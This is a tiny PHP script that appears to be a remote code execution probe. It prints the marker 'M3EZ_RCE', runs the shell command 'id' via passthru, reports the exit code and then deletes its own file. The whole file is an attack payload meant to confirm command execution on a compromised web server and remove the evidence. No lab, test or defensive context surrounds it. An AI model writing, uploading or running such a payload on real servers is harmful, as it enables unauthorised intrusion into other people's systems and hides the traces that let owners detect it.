 <?php
  header('Content-Type: text/plain');
  echo "M3EZ_RCE\n";
  passthru("id", $rc);
  echo "exit_code=$rc\n";
  @unlink(__FILE__);
  ?>
